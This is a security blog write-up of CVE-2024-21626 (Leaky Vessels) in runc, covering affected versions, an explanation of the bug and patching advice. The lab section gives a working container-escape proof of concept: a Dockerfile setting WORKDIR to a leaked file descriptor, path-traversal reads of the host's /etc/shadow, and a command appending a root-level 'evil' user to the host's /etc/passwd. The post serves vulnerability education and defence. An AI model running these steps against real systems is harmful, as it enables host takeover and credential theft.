Leaky Vessels Part 1: CVE-2024-21626
Screenshots from the blog posts

##
#
https://www.vicarius.io/vsociety/posts/leaky-vessels-part-1-cve-2024-21626
#
##


images/clslxl4j6nweo1hon0hqx6ty5.jpgimages/clslxl4j6nweo1hon0hqx6ty5.jpg
Summary
Let's talk about part one of Leaky Vessels - CVE-2024-21626 - in the runc component. This bug allows attackers to escape the isolated environment of the container, granting unauthorized access to the host operating system and potentially compromising the entire system.

Description
Introduction


According to National Vulnerability Database (NVD):

runc is a CLI tool for spawning and running containers on Linux according to the OCI specification. In runc 1.1.11 and earlier, due to an internal file descriptor leak, an attacker could cause a newly-spawned container process (from runc exec) to have a working directory in the host filesystem namespace, allowing for a container escape by giving access to the host filesystem ("attack 2"). The same attack could be used by a malicious image to allow a container process to gain access to the host filesystem through runc run ("attack 1"). Variants of attacks 1 and 2 could be also be used to overwrite semi-arbitrary host binaries, allowing for complete container escapes ("attack 3a" and "attack 3b"). runc 1.1.12 includes patches for this issue.

Reference: https://nvd.nist.gov/vuln/detail/CVE-2024-21626



CVSS 3.x Severity and Metrics:

CNA: GitHub, Inc.

Base Score: 8.6 HIGH

Vector: CVSS:3.1/AV:L/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:H





Affected and patched software versions:


For runc:

Range of affected versions: >= v1.0.0-rc93, <=1.1.11

Fixed version: 1.1.12



For containerd:

Range of affected versions: 1.4.7 to 1.6.27 and 1.7.0 to 1.7.12

Fixed versions: 1.6.28 and 1.7.13



For docker:

Fixed version: 25.0.2





ELI5 - Analogy for the bug
Consider a box that's enclosed and anything inside the box isn't able to see or interact with anything outside of the box, under normal circumstances.

Now imagine a hole being plugged into the box. This hole provides a way to see and interact with the environment outside of the box.

This, in a gist, is what CVE-2024-21626 is all about.



It's a part of the Leaky Vessels flaw in runc. From the ELI5 example perspective, we can clearly understand why the term was used.



Image Reference: https://thenewstack.io/leaky-vessels-vulnerability-sinks-container-security/



Due to this bug, as one can imagine, container breakout and ultimately the access to the host file system is possible. As one can imagine, this is quite serious because containers allow isolation of the container environment from the host environment.



Lab Setup
docker version:

kali@kali:~$ docker --version
Docker version 20.10.25+dfsg1, build b82b9f3


runc version:

kali@kali:~$ runc --version  
runc version 1.1.10+ds1
commit: 1.1.10+ds1-1
spec: 1.1.0
go: go1.21.3
libseccomp: 2.5.4


Save the following contents as Dockerfile:

FROM debian:bookworm
WORKDIR /proc/self/fd/8


Build the docker image:

docker build -t cve_2024_21626 .


Run the docker container from the above docker image:

docker run --rm -it --name test cve_2024_21626




In the above Dockerfile, we have set the working directory of the container to /proc/self/fd/8.



Where does the value (for fd) 8 comes from?



As per the following advisory - https://github.com/opencontainers/runc/security/advisories/GHSA-xr7r-f8xq-vfvv



Attack 1: process.cwd "mis-configuration"

In runc 1.1.11 and earlier, several file descriptors were inadvertently leaked internally within runc into runc init, including a handle to the host's /sys/fs/cgroup (this leak was added in v1.0.0-rc93). If the container was configured to have process.cwd set to /proc/self/fd/7/ (the actual fd can change depending on file opening order in runc), the resulting pid1 process will have a working directory in the host mount namespace and thus the spawned process can access the entire host filesystem. This alone is not an exploit against runc, however a malicious image could make any innocuous-looking non-/ path a symlink to /proc/self/fd/7/ and thus trick a user into starting a container whose binary has access to the host filesystem.



We can clearly understand that when runc init is executed, several file descriptors are leaked internally. So when the docker container includes one of the leaked handles, specifically the one pointing to /sys/fs/cgroup, an adversary can leverage it to break out of the container.



The handle to /sys/fs/cgroup is said to be set to /proc/self/fd/7/ (the actual fd value, 7 in this above advisory, can vary). So it is very much possible that the fd value is >= 7.



So the easiest way to find out the correct fd in your case is to start trying the fd values from 7 and increment it until you don't see any errors (it's usually 7 or 8):



For fd value set to 7:



For fd value set to 8:



In my local setup, the fd value 8 worked. That's the reason the initial Dockerfile stated /proc/self/fd/8 as the WORKDIR but it's advised to try fds starting from 7 and increment it one-by-one to arrive at the correct fd. Usually the fd value of 7 or 8 works.



If anyone's interested in a more technical reason for why fd value for /sys/fs/cgroup is >=7, here's a more nuanced and complete reasoning:



It's related to Golang runtime. First there is no doubt that file descriptor 0, 1 and 2 are stands for stdin, stdout, stderr. The file descriptor of the log file specified by --log parameter is 3. Golang runtime subsequently calls epoll_create(2) to create file descriptor 4 and pipe(2) to create two file descriptors 5 and 6. Now, opening /sys/fs/cgroup creates file descriptor 7.

The reason why opening the log file at first, then Go runtime calling epoll_create(2) and pipe2(2) is related to the implementation of Go runtime, it's a long story again.



Reference: https://nitroc.org/en/posts/cve-2024-21626-illustrated/#why-the-file-descriptor-of-sysfscgroup-is-7



Exploitation


Since we now have a reference to the host file system, we can actually read any of the files on the host system by leveraging the leaked file handle to the /sys/fs/cgroup directory.



Reading arbitrary files


To read any arbitrary file, we just have to use enough ../ sequences to reach to the directory and file of our interesting and we would be able to read/write to that file.



Let's try this by reading the /etc/hosts file of the host machine:
```
root@90c4baf8b91f:.# cat /etc/hosts
job-working-directory: error retrieving current directory: getcwd: cannot access parent directories: No such file or directory
127.0.0.1       localhost
::1     localhost ip6-localhost ip6-loopback
fe00::0 ip6-localnet
ff00::0 ip6-mcastprefix
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
172.17.0.2      90c4baf8b91f
root@90c4baf8b91f:.# 
root@90c4baf8b91f:.# 
root@90c4baf8b91f:.# cat /proc/1/cwd/../../../../../../../../etc/hosts
job-working-directory: error retrieving current directory: getcwd: cannot access parent directories: No such file or directory
127.0.0.1       localhost
127.0.1.1       kali
::1             localhost ip6-localhost ip6-loopback
ff02::1         ip6-allnodes
ff02::2         ip6-allrouters
root@90c4baf8b91f:.# 
root@90c4baf8b91f:.# 
```



To confirm that we read the /etc/hosts file for the underlying host machine, we can check the contents for the file on the host system directly (this is our Kali machine, not the docker container):
```
kali@kali:~$ cat /etc/hosts
127.0.0.1       localhost
127.0.1.1       kali
::1             localhost ip6-localhost ip6-loopback
ff02::1         ip6-allnodes
ff02::2         ip6-allrouters

kali@kali:~$ 
```



Reading system files


Two of the important system files in Linux systems are /etc/passwd and /etc/shadow.

Let's try to read the /etc/shadow file from the host system (the Kali machine):


```
root@90c4baf8b91f:.# cat /proc/1/cwd/../../../../../../../../etc/shadow
job-working-directory: error retrieving current directory: getcwd: cannot access parent directories: No such file or directory
root:*:19691:0:99999:7:::
daemon:*:19691:0:99999:7:::
bin:*:19691:0:99999:7:::
sys:*:19691:0:99999:7:::
sync:*:19691:0:99999:7:::
games:*:19691:0:99999:7:::
man:*:19691:0:99999:7:::
lp:*:19691:0:99999:7:::
mail:*:19691:0:99999:7:::
news:*:19691:0:99999:7:::
uucp:*:19691:0:99999:7:::
proxy:*:19691:0:99999:7:::
www-data:*:19691:0:99999:7:::
...
_gvm:!:19691::::::
kali:$y$j9T$gl--REDACTED--7ND:19691:0:99999:7:::
uuidd:!:19724::::::
```

Note: The password for the kali user in the above output has been redacted.



The following screenshot shows the same results as above:



Modifying system files


Now that we have established that we can read arbitrary files from the underlying host machine, let's take this a step further and let's modify the /etc/passwd file.



Before doing that, on the Kali machine, run the following command to generate a hashed password - passwd, to be stored in the /etc/passwd file via this vulnerability we have been exploring.



kali@kali:~$ openssl passwd -6 -salt wow passwd            
$6$wow$ANbY2P/OCVnraBHDL9W2Pc1rS3mV9K9fwC8yQaj6KlP.F0Nrhgg05HXyP2V.ZhdXDeLCcSwc4dy8c27qwQlb40


Next, check the contents for the /etc/passwd file for the underlying host from the container:

root@90c4baf8b91f:.# cat /proc/1/cwd/../../../../../../../../etc/passwd
job-working-directory: error retrieving current directory: getcwd: cannot access parent directories: No such file or directory
root:x:0:0:root:/root:/usr/bin/zsh
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
...
mosquitto:x:131:133::/var/lib/mosquitto:/usr/sbin/nologin
inetsim:x:132:134::/var/lib/inetsim:/usr/sbin/nologin
_gvm:x:133:136::/var/lib/openvas:/usr/sbin/nologin
kali:x:1000:1000:,,,:/home/kali:/usr/bin/zsh
uuidd:x:134:138::/run/uuidd:/usr/sbin/nologin


...



Notice the last entry for your reference.



Now we will modify this file and add a new user named evil with the password hash we generated earlier:

root@90c4baf8b91f:.# echo 'evil:$6$wow$ANbY2P/OCVnraBHDL9W2Pc1rS3mV9K9fwC8yQaj6KlP.F0Nrhgg05HXyP2V.ZhdXDeLCcSwc4dy8c27qwQlb40:0:0:evil user:/root:/bin/bash' >> /proc/1/cwd/../../../../../../../../etc/passwd




Now, back to the Kali machine, check the contents for the /etc/passwd file:



...



Notice that the file is modified and has a new user named evil with the password set to passwd. This new user has the uid and gid set to 0 (that is the almighty root user).



Now depending on what all services are available on the underlying host, an attacker can gain root access to the underlying machine.



One of the example scenarios is as follows:

SSH is running on the underlying machine. If this is the case, the attacker can SSH into the underlying host machine as the evil user and get root privileges.



Conclusion


In this post, we analyzed CVE-2024-21626, a part of the Leaky Vessels flaws recently discovered in the runc component.



It allows attackers to escape the isolated environment of the container, granting unauthorized access to the host operating system and potentially compromising the entire system as we just saw with our setup.



It is advised to patch your systems by updating the docker and runc components to their respective latest versions as soon as possible.



References
NVD - CVE-2024-21626: https://nvd.nist.gov/vuln/detail/CVE-2024-21626

Several container breakouts due to internally leaked fds · Advisory · opencontainers/runc · GitHub: https://github.com/opencontainers/runc/security/advisories/GHSA-xr7r-f8xq-vfvv

Leaky Vessels flaws in runc: https://www.bleepingcomputer.com/news/security/leaky-vessels-flaws-allow-hackers-to-escape-docker-runc-containers/

Why the File Descriptor of /sys/fs/cgroup is 7: https://nitroc.org/en/posts/cve-2024-21626-illustrated/#why-the-file-descriptor-of-sysfscgroup-is-7
